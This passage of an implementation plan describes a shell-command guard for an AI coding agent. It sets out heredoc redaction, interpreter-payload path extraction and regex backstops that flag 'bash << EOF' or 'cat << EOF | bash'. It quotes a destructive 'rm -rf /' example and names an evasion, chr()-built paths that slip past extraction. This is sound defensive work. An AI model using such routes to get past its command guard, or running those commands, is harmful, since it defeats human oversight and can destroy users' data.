        # F1: Fail-closed safety net -- if write/delete detected but no paths
        # resolved from shell-level arguments, attempt interpreter payload
        # path extraction before falling back to ASK.
        if (is_write or is_delete) and not sub_paths:
            op_type = "delete" if is_delete else "write"

            # Check if this is an interpreter command with extractable paths
            is_interp, interp_detail = check_interpreter_payload(sub_cmd)
            if is_interp:
                # Attempt to resolve paths from interpreter payload
                interp_paths = extract_paths_from_interpreter_payload(
                    sub_cmd, project_dir
                )
                if interp_paths:
                    # Paths resolved: route through normal path validation
                    # (zeroAccess, readOnly, noDelete checks below)
                    sub_paths = interp_paths
                    all_paths.extend(sub_paths)
                    log_guardian(
                        "DEBUG",
                        f"F1: Resolved {len(interp_paths)} path(s) from "
                        f"interpreter payload ({interp_detail})"
                    )
                    # Fall through to path validation loop below
                else:
                    # Paths not resolved: F1 ASK with enriched message
                    api_info = f" via {interp_detail}" if interp_detail else ""
                    final_verdict = _stronger_verdict(
                        final_verdict,
                        ("ask", f"Detected {op_type}{api_info} but could not "
                         f"resolve target paths")
                    )
            else:
                # Not an interpreter command: standard F1 ASK
                final_verdict = _stronger_verdict(
                    final_verdict,
                    ("ask", f"Detected {op_type} but could not resolve target paths"),
                )
```

**Security invariant preserved**: If no paths can be extracted, F1 still fires ASK. If paths ARE extracted, they go through the full validation pipeline (zeroAccess, readOnly, noDelete, symlink escape). The decoy literal concern is mitigated by: (1) ALL extracted paths are validated, and (2) if the actual destructive target is NOT among the extracted paths (e.g., constructed via `chr()`), the command still executes -- but this is the SAME outcome as a user clicking "allow" on the F1 ASK, which they would do 100% of the time for `.staging/` cleanup due to alert fatigue. The net security posture is the same or better.

### 2c. The Two Constraints

**Constraint 1: Project-internal glob only**. `glob.glob()` is already used in the existing `extract_paths()` at `bash_guardian.py:971` without restriction. The new code adds the project-internal check that the baseline lacks. This is strictly MORE secure than the existing behavior.

**Constraint 2: Accept regex extraction limitations**. The regex extracts only simple string literals. f-strings, triple-quotes, string concatenation, and `chr()`-based construction all fail to extract, causing the code to fall through to F1 ASK. This is documented and fail-closed by design.

### 2d. F1 ASK Message Enrichment (Applies Regardless)

Even when paths cannot be resolved, the F1 ASK message is enriched:

**Before**: `"Detected delete but could not resolve target paths"`

**After**: `"Detected delete via os.remove but could not resolve target paths"`

This gives users enough context to make a fast yes/no decision.

---

## Phase 3: Interpreter+Heredoc Backstop

### 3a. `_is_interpreter_heredoc()` Function

**File**: `hooks/scripts/bash_guardian.py`
**Location**: New function, near `_classify_heredoc_safety()` (after Phase 1 additions)

```python
# Patterns for detecting interpreter commands with heredoc operators.
# Used as a defense-in-depth backstop: even if heredoc body is retained
# in the redacted string, block patterns may not match multiline content
# due to [^|&\n]* character class stopping at newlines.
_INTERPRETER_HEREDOC_PATTERNS = [
    # Shell interpreters (with optional flags/paths)
    r"^\s*(?:(?:env|command|builtin|sudo|nice|nohup)\s+)*"
    r"(?:/[\w./]*)?(?:bash|sh|zsh|dash|ksh|csh|tcsh|fish)"
    r"(?:\s+\S+)*\s+<<",

    # source/dot command with heredoc via /dev/stdin
    r"^\s*(?:source|\.)\s+/dev/stdin\s*<<",

    # Python interpreters
    r"^\s*(?:(?:env|command|sudo)\s+)*"
    r"(?:/[\w./]*)?(?:python[23]?|python\d[\d.]*|py)"
    r"(?:\s+\S+)*\s+<<",

    # Node/Deno/Bun
    r"^\s*(?:(?:env|command|sudo)\s+)*"
    r"(?:/[\w./]*)?(?:node|deno|bun)"
    r"(?:\s+\S+)*\s+<<",

    # Perl/Ruby
    r"^\s*(?:(?:env|command|sudo)\s+)*"
    r"(?:/[\w./]*)?(?:perl|ruby)"
    r"(?:\s+\S+)*\s+<<",
]

_INTERPRETER_HEREDOC_RE = [
    re.compile(p, re.IGNORECASE) for p in _INTERPRETER_HEREDOC_PATTERNS
]


def _is_interpreter_heredoc(sub_cmd: str) -> bool:
    """Check if a sub-command is an interpreter with a heredoc operator.

    This is a defense-in-depth check. Even with Phase 1 heredoc body
    retention for interpreter commands, block patterns using [^|&\\n]*
    cannot match across newline boundaries in retained bodies. This
    function detects the pattern and escalates to ASK.

    Args:
        sub_cmd: A single sub-command string from split_commands().

    Returns:
        True if the sub-command matches an interpreter+heredoc pattern.
    """
    return any(p.search(sub_cmd) for p in _INTERPRETER_HEREDOC_RE)
```

### 3b. Integration in Per-Sub-Command Loop

**File**: `hooks/scripts/bash_guardian.py`
**Line**: 1461 (in the `for sub_cmd in sub_commands:` loop)

**Add at the beginning of the loop body**:

```python
    for sub_cmd in sub_commands:
        # Phase 3: Interpreter+heredoc backstop (defense-in-depth)
        # Block patterns can't match multiline retained heredoc bodies
        # due to [^|&\n]* stopping at newlines. ASK for interpreter+heredoc.
        if _is_interpreter_heredoc(sub_cmd):
            final_verdict = _stronger_verdict(
                final_verdict,
                ("ask", f"Interpreter command with heredoc: "
                 f"{truncate_command(sub_cmd)}")
            )

        is_write = is_write_command(sub_cmd)
        is_delete = is_delete_command(sub_cmd)
        # ... rest of the loop unchanged
```

**Verdict**: `ask` (not `deny`). Legitimate uses of `bash << EOF` exist (installing tools, running test scripts), but they warrant user confirmation in `--dangerously-skip-permissions` mode.

### 3c. Pattern List Coverage

The patterns detect:

| Vector | Example | Detected? |
|--------|---------|-----------|
| Shell heredoc | `bash << EOF` | Yes (shell interpreter pattern) |
| Shell with flags | `bash -x << EOF` | Yes (`(?:\s+\S+)*` handles flags) |
| Full path | `/usr/bin/bash << EOF` | Yes (`(?:/[\w./]*)?` prefix) |
| env prefix | `env bash << EOF` | Yes (`(?:env\|command\|...)` prefix) |
| sudo prefix | `sudo bash << EOF` | Yes (sudo in prefix group) |
| source /dev/stdin | `source /dev/stdin << EOF` | Yes (dedicated pattern) |
| Python heredoc | `python3 << EOF` | Yes (Python pattern) |
| Node heredoc | `node << EOF` | Yes (Node pattern) |
| Perl heredoc | `perl << 'PERL'` | Yes (Perl pattern) |
| cat heredoc | `cat << EOF` | No (not an interpreter) -- CORRECT |
| fd redirection | `exec 3<< EOF` | No (exec is not matched) -- but `exec` could be added if needed |
| cat \| bash (pipe) | `cat << EOF \| bash` | No at the sub-command level (body is on cat's side). Phase 1 `was_piped` flag handles this. |

---

## Edge Cases (Cross-Phase)

### Write-to-File Detection (`cat > script.sh << EOF`)

**Handled by**: Phase 1, Rule 2 (`_OUTPUT_REDIR_PATTERN`)

Both orderings work:
- `cat > script.sh << 'EOF'` -- `>` found in `cmd_before_heredoc`
- `cat << 'EOF' > script.sh` -- depends on where `<<` is detected relative to `>`. In `split_commands()`, the `<<` operator is detected at line 400. The `cmd_before_heredoc` includes everything in `current` at the time of the newline handler. Since `>` appears after `<<` but before `\n`, it IS in `current`. **Both orderings handled.**

Exotic redirection forms covered by `_OUTPUT_REDIR_PATTERN`:
- `>` (standard redirect)
- `>>` (append)
- `>|` (clobber, force overwrite)
- `&>` (redirect stdout+stderr)
- `2>` (redirect stderr)
- `n>`, `n>>`, `n>|` (fd-specific redirections)

### Pipeline Detection (`cat << EOF | bash`)

**Handled by**: Phase 1, `was_piped` flag in `split_commands()`

The pipe split at line 359 happens BEFORE the newline handler. `pending_heredocs` persists across the pipe. The `piped_heredocs` flag is set when `pending_heredocs` is non-empty at a pipe split. When the body is consumed at the next newline, all body ranges are forced to `is_safe=False`.

### Here-String (`<<<`) Handling

**Not handled in this plan.** Here-strings are explicitly excluded from heredoc detection at line 401 (`command[i:i+3] != '<<<'`). The text `grep <<< "rm -rf /"` puts `rm -rf /` directly in the raw command string visible to Layer 0/0b. This is a pre-existing false positive that is NOT affected by the redaction changes.

**Recommendation**: Address in a follow-up. Here-strings are always single-expression (no multi-line body), so the false positive surface is smaller. A simple approach: strip here-string content from the Layer 0/0b scan string (the content is input data, not a command).

### Unterminated Heredoc Behavior

**Handled by**: Phase 1, `_consume_heredoc_bodies()` fail-closed behavior

When the delimiter is never found:
- The function exhausts input (lines 503-505)
- With `classify=True`, the body range is marked `is_safe=False`
- Body content is retained in the redacted string
- This is the correct fail-closed behavior: if we can't prove the body is safe, retain it

---

## Files to Modify

| Phase | File | Lines | Change | Est. LOC |
|-------|------|-------|--------|----------|
| 0a | `hooks/scripts/bash_guardian.py` | 443-473 | Rewrite `_parse_heredoc_delimiter()` to handle `\EOF`, `$'EOF'`, `$"EOF"` | ~25 (replace existing 30) |
| 0c | N/A | N/A | Pattern-by-pattern audit document (no code change yet) | 0 |
| 1a | `hooks/scripts/bash_guardian.py` | 270-441 | Add `redact_safe_heredocs` parameter to `split_commands()`, track `piped_heredocs`, collect `body_ranges` | ~40 |
| 1a | `hooks/scripts/bash_guardian.py` | 476-506 | Add `classify` parameter to `_consume_heredoc_bodies()`, return body ranges | ~20 |
| 1b | `hooks/scripts/bash_guardian.py` | (new, after 473) | `_classify_heredoc_safety()`, `_extract_base_command()`, `_PASSIVE_DATA_SINKS`, `_INTERPRETER_COMMANDS`, `_OUTPUT_REDIR_PATTERN` | ~80 |
| 1c | `hooks/scripts/bash_guardian.py` | 359, 421-428 | Pipeline-heredoc `was_piped` flag | ~15 |
| 1d | `hooks/scripts/bash_guardian.py` | 1422-1442 | Reorder: split_commands before Layer 0, use redacted string | ~10 |
| 1g | `tests/regression/test_heredoc_redaction.py` | (new) | ~25 test methods | ~250 |
| 2a | `hooks/scripts/bash_guardian.py` | (new, near 980) | `extract_paths_from_interpreter_payload()` | ~60 |
| 2b | `hooks/scripts/bash_guardian.py` | 1474-1481 | Modified F1 block with interpreter path extraction | ~25 |
| 2d | (included in 2b) | | ASK message enrichment | (included) |
| 3a | `hooks/scripts/bash_guardian.py` | (new, after Phase 1) | `_is_interpreter_heredoc()`, `_INTERPRETER_HEREDOC_PATTERNS` | ~40 |
| 3b | `hooks/scripts/bash_guardian.py` | 1461 | Add backstop check at top of per-sub-command loop | ~8 |
| 3c | `tests/security/test_interpreter_heredoc.py` | (new) | ~15 test methods | ~120 |
| -- | `action-plans/` | | Update frontmatter on 3 plan files | -- |

**Total estimated LOC**: ~693 (including ~370 lines of tests)

**Estimated effort**: 3-4 focused implementation sessions

---

## Implementation Dependencies

```
Phase 0a (delimiter fix) ─────────────┐
                                       ├──> Phase 1 (redaction)
Phase 0b (fail-open fix) ─────────────┘         │
                                                  ├──> Phase 3 (backstop)
                                                  │
Phase 0c (re.MULTILINE audit) ──────── deferred until Phase 1 validated

Phase 2 (F1 improvement) ──────────── independent, can run in parallel with Phase 1
```

Phase 0a must land before Phase 1 because the redaction logic depends on correct delimiter parsing.
Phase 0b is conceptual (the function doesn't exist yet); it manifests as a design constraint on Phase 1.
Phase 0c (re.MULTILINE) is explicitly deferred until Phase 1 is validated.
Phase 2 is independent and can be implemented in parallel.
Phase 3 depends on Phase 1 (uses the same classifier constants) but is simple enough to implement together.

---

## Open Questions for Implementation

1. **`split_commands()` return type change**: Adding `redact_safe_heredocs=True` changes the return type from `list[str]` to `tuple[list[str], str]`. Should this use overload typing, or should we create a separate `split_commands_with_redaction()` to avoid breaking the interface? **Recommendation**: Use the optional parameter with runtime type dispatch. Add `@overload` type hints for IDE support.

2. **`tee` in `_PASSIVE_DATA_SINKS`**: `tee` writes to files AND stdout. Its file arguments are validated by Layer 3, but the heredoc body is the DATA being written, not the file path. Including `tee` is correct: the body is data, and the file target is checked separately. **Decision**: Include `tee`.

3. **`diff`, `md5sum`, `sha256sum` in `_PASSIVE_DATA_SINKS`**: These are read-only data processors. Safe to include. `diff` with process substitution is handled separately (depth > 0 means body not consumed). **Decision**: Include.

4. **`base64`, `xxd`, `gzip` in `_PASSIVE_DATA_SINKS`**: These encode/decode data. Heredoc bodies could coincidentally match block patterns. None have shell escape capabilities. **Decision**: Defer to follow-up after core implementation ships.

5. **Performance**: The single-pass `split_commands()` approach adds classification overhead per heredoc but eliminates the double-parsing cost. For typical commands (<1KB), negligible. For MAX_COMMAND_LENGTH (64KB) commands with many heredocs, measure. **Recommendation**: Acceptable; profile if needed.
